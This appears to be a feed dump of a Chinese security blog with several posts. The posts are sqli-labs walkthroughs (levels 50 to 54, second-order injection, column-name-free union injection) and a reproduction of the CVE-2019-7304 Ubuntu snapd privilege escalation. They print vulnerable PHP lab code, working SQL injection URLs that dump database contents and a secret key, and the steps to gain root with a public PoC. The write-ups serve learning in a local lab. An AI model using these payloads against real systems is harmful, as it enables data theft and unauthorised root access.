$query;        $data = mysql_query( $query, $conn ) or die( &#39;Error!!&#39; );        mysql_close( $conn );        $result = mysql_fetch_array( $data );        $_SESSION[&#39;user_id&#39;] = $result[&#39;user_id&#39;];    }    $html_avatar = htmlspecialchars( $_SESSION[&#39;avatar&#39;] );?&gt;&lt;div class=&quot;row&quot;&gt;    &lt;div style=&quot;float:left;&quot;&gt;        &lt;img src=&quot;avatar.php&quot; width=&quot;100&quot; height=&quot;100&quot; class=&quot;img-thumbnail&quot; &gt;        &lt;div class=&quot;text-center&quot;&gt;&lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div style=&quot;float:right;padding-right:900px&quot;&gt;        &lt;div&gt;&lt;a href=&quot;logout.php&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot;&gt;退出&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;        &lt;br /&gt;        &lt;div&gt;&lt;a href=&quot;edit.php&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot;&gt;编辑&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;        &lt;br /&gt;        &lt;div&gt;&lt;a href=&quot;../message.php&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot;&gt;发留言&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;    &lt;/div&gt;&lt;/div&gt;&lt;?php    require_once &#39;../footer.php&#39;;}else {    not_find( $_SERVER[&#39;PHP_SELF&#39;] );}?&gt;</code></pre><p><b>整体思路</b></p><pre><code>注册用户名的时候，如果注册成功就将注册的用户名带入session然后在写入数据库里，然后跳转到user.php里面进行查询。虽然user.php的查询没有做过滤$_SESSION[&#39;username&#39;]但是由于注册的哪里做了SQL过滤。所以带入sesion的时候已经被过滤了，所以注入不了然后进行退出，重新登陆，虽然登录哪里做了过滤但是用户名成功查询到了，然后将查询到的用户名带入session然后跳到user.php里面进行查询，由于直接将查询成功的用户名带入user.php查询中途没做任何过滤，user.php也没有过滤所以导致二次注入</code></pre><p><b>实验</b><br>PS：首先说一下这个靶场的坑b之处，只要语句查询成功就不输出Error，是输出error不是mysql报错<br>也就是说完全是用来测试二次注入的。。这作者得挨打</p><p>先注册一个a’的用户名<br>下图为注册成功后调整到user.php<br><img src="https://s2.ax1x.com/2019/02/15/krwiKs.md.png" alt="krwiKs.md.png"></p><p>处理注册的php<br><img src="https://s2.ax1x.com/2019/02/15/krwkbq.png" alt="krwkbq.png"></p><p>退出重新登陆<br><img src="https://s2.ax1x.com/2019/02/15/krwZ5T.png" alt="krwZ5T.png"></p><p>处理登陆的php<br><img src="https://s2.ax1x.com/2019/02/15/krwmPU.png" alt="krwmPU.png"></p><p>这里的查询语句输出我自己加上去的，方便看效果</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL injection without getting the column name</title>
      <link href="/posts/f0db9a18.html"/>
      <url>/posts/f0db9a18.html</url>
      <content type="html"><![CDATA[<h2 id="在无法得到列名下进行注入"><a href="#在无法得到列名下进行注入" class="headerlink" title="在无法得到列名下进行注入"></a>在无法得到列名下进行注入</h2><p><b>BGM：Welcome to Planet Urf</b><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31311706&auto=1&height=66"></iframe></p><hr><p>从这篇文章学习的：<a href="https://nosec.org/home/detail/2245.html" target="_blank" rel="noopener">如何在不知道MySQL列名的情况下注入出数据？|NOSEC安全讯息平台 - NOSEC.ORG</a></p><p>此方法适用于以下：</p><pre><code>盲注的时候跑不出列名</code></pre><p>利用条件：</p><pre><code>知道列名的个数</code></pre><p>mysql命令行测试：</p><pre><code>表名为：usersusers表里面的列名有：id,username,password列的个数为3 (1,2,3) (1=&gt;id,2=&gt;username,3=&gt;password)</code></pre><p>查询语句为：</p><pre><code class="mysql">select * from users where id=1</code></pre><p>payload：</p><pre><code class="mysql">union select 1,(select `2` from (select 1,2,3 union select * from users)a limit 1,1),3</code></pre><p>结果：<br><img src="https://s2.ax1x.com/2019/02/14/kDA439.png" alt="kDA439.png"></p><p>靶场测试：<br><img src="https://s2.ax1x.com/2019/02/14/kDAIj1.png" alt="kDAIj1.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli labs Less 50 -&gt; Less 54</title>
      <link href="/posts/b0e668d5.html"/>
      <url>/posts/b0e668d5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>距离上学还有3天，今天继续闯sqli-labs靶场，从50关崩到54关，感觉可还行<br><img src="http://i0.hdslb.com/bfs/archive/5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg" alt="5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg"><br><b>BGM:喜欢</b></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526464145&auto=1&height=66"></iframe><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p>50关代码</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sqli-connect.php&quot;);error_reporting(0);$id=$_GET[&#39;sort&#39;];    if(isset($id)){    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql=&quot;SELECT * FROM users ORDER BY $id&quot;;    /* execute multi query */    if (mysqli_multi_query($con1, $sql))    {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php            /* store first result set */            if ($result = mysqli_store_result($con1))            {                while($row = mysqli_fetch_row($result))                {                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                            echo &quot;&lt;tr&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[0]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[1]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[2]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;/tr&gt;&quot;;                    echo &quot;&lt;/font&gt;&quot;;                }            }    echo &quot;&lt;/table&gt;&quot;;    }    else    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysqli_error($con1));        echo &quot;&lt;/font&gt;&quot;;      }}else{    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &#39;&lt;img src=&quot;../images/Less-50.jpg&quot; /&gt;&lt;br&gt;&#39;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>还是order by注入，报错注入带走</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-50/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kBzIXD.md.png" alt="kBzIXD.md.png"></p><p>51关代码：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sqli-connect.php&quot;);error_reporting(0);$id=$_GET[&#39;sort&#39;];    if(isset($id)){    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;    /* execute multi query */    if (mysqli_multi_query($con1, $sql))     {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php            /* store first result set */            if ($result = mysqli_store_result($con1))            {                while($row = mysqli_fetch_row($result))                {                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                            echo &quot;&lt;tr&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[0]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[1]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[2]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;/tr&gt;&quot;;                    echo &quot;&lt;/font&gt;&quot;;                }            }    echo &quot;&lt;/table&gt;&quot;;    }    else    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysqli_error($con1));        echo &quot;&lt;/font&gt;&quot;;      }}else{    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &#39;&lt;img src=&quot;../images/Less-51.jpg&quot; /&gt;&lt;br&gt;&#39;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>多了个需要闭合还是报错注入带走</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-51/?sort=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20--+</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kBzv1f.png" alt="kBzv1f.png"></p><p>52关代码：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sqli-connect.php&quot;);error_reporting(0);$id=$_GET[&#39;sort&#39;];    if(isset($id)){    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;    /* execute multi query */    if (mysqli_multi_query($con1, $sql)) /*查询*/    {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php            /* store first result set */            if ($result = mysqli_store_result($con1))            {                while($row = mysqli_fetch_row($result))                {                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                            echo &quot;&lt;tr&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[0]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[1]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[2]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;/tr&gt;&quot;;                    echo &quot;&lt;/font&gt;&quot;;                }            }    echo &quot;&lt;/table&gt;&quot;;    }}else{    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &#39;&lt;img src=&quot;../images/Less-53.jpg&quot; /&gt;&lt;br&gt;&#39;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>没有输出mysql报错，盲注带走</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-52/?sort=rand(length(database())=8)</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kDSkhq.md.png" alt="kDSkhq.md.png"></p><p>53关代码：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sqli-connect.php&quot;);error_reporting(0);$id=$_GET[&#39;sort&#39;];    if(isset($id)){    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;    /* execute multi query */    if (mysqli_multi_query($con1, $sql)) /*查询*/    {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php            /* store first result set */            if ($result = mysqli_store_result($con1))            {                while($row = mysqli_fetch_row($result))                {                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                            echo &quot;&lt;tr&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[0]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[1]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;td&gt;&quot;;                    printf(&quot;%s&quot;, $row[2]);                    echo &quot;&lt;/td&gt;&quot;;                    echo &quot;&lt;/tr&gt;&quot;;                    echo &quot;&lt;/font&gt;&quot;;                }            }    echo &quot;&lt;/table&gt;&quot;;    }}else{    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &#39;&lt;img src=&quot;../images/Less-53.jpg&quot; /&gt;&lt;br&gt;&#39;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>回显不正常只能延时注入，由于延时注入从图片中看不出效果这里就不放了</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-53/?sort=1%27%20and%20sleep(if((length(dataabse())=8),1,4))%20--+</code></pre><p>54关代码：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-54:Challenge-1&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects... /*获取当前php的路径*/$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data /*用于生成随机数据的字符集*/$times= 10;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])) /*判断answer_key如果否存在，如果不存在则执行以下操作*/{    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;])) /*如果POST的传参reset存在*/    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000); /*设置一个cookie然后跳转*/        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; ); /*重定向到主页*/        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;])) /*判断是否有cookie存在*/        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire); /*如果是第一次访问给予一个cookie*/        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;])) /*判断是否有GET传参ID的存在*/        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-54.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]); /*处理特殊字符*/    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求你注入获取到key，数据库不在是security,限制注入次数为10次，如果超过此次数，重定向到主页，并且每次的密码都是随机的。虽然如此，但是这是通过cookie来判断你的次数，你可以修改你cookie或者更换IP和浏览器来进行多次试验<br>PS:给出数据库名：challenges<br><img src="https://s2.ax1x.com/2019/02/14/kDP6ij.png" alt="kDP6ij.png"></p><pre><code>payload:http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%22v1icuozblo%22%20--+http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(secret_J0N4,tryy),3%20from%20v1icuozblo%20--+</code></pre><p>最终得到随机密码是：J7oVFGp7S8WSd5Nb1xLBK7uF11</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2019-7304 Ubuntu Equity</title>
      <link href="/posts/92d560e0.html"/>
      <url>/posts/92d560e0.html</url>
      <content type="html"><![CDATA[<h2 id="CVE-2019-7304复现"><a href="#CVE-2019-7304复现" class="headerlink" title="CVE-2019-7304复现"></a>CVE-2019-7304复现</h2><hr><ul><li>前言</li><li>正文</li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>今天tm的情人节，我还在复现漏洞真是太爽了<br><img src="http://p3.pstatp.com/large/pgc-image/15319211658406048fb51ad" alt="15319211658406048fb51ad"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><hr><p>本次提权漏洞有以下Ubuntu版本受到影响：</p><pre><code>Ubuntu 18.10Ubuntu 18.04 LTSUbuntu 16.04 LTSUbuntu 14.04 LTS</code></pre><p>提权漏洞的起因是：<br>由于 snapd API 中的错误，Ubuntu Linux 部分版本被发现有本地权限提升漏洞</p><p><b>复现</b><br>我的环境是：</p><pre><code>Ubuntu version:16.04 LTSsnapd API version:2.34.2</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kB12w9.png" alt="kB12w9.png"></p><p>下载POC：<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">GitHub - initstring/dirty_sock: Ubuntu Linux privilege escalation exploit (CVE-2019-7304)</a><br><img src="https://s2.ax1x.com/2019/02/14/kB1oQO.md.png" alt="kB1oQO.md.png"></p><p>第一个POC<br>先登录Ubuntu，<a href="https://login.ubuntu.com/" target="_blank" rel="noopener">https://login.ubuntu.com/</a><br>在本地生成秘钥：</p><pre><code>ssh-keygen -t rsa -C &quot;&lt;you email&gt;&quot;</code></pre><p>然后到./.ssh下把，id_rsa.pub（公钥）拷到你账户的ssh_key里面去<br><img src="https://s2.ax1x.com/2019/02/14/kB14W6.png" alt="kB14W6.png"></p><p>本地执行第一个poc<br><img src="https://s2.ax1x.com/2019/02/14/kB17Oe.md.png" alt="kB17Oe.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/14/kB1qwd.png" alt="kB1qwd.png"></p><p>如果出现,以下问题就是你没有安装ssh服务<br><img src="https://s2.ax1x.com/2019/02/14/kB1vfP.md.png" alt="kB1vfP.md.png"></p><p>执行：apt-get install openssh-server 即可解决问题，然后再执行一次POC就ok</p><p>执行完POC后，sudo -i即可获取root权限<br><img src="https://s2.ax1x.com/2019/02/14/kB3790.png" alt="kB3790.png"></p><p>第二个POC直接执行即可<br><img 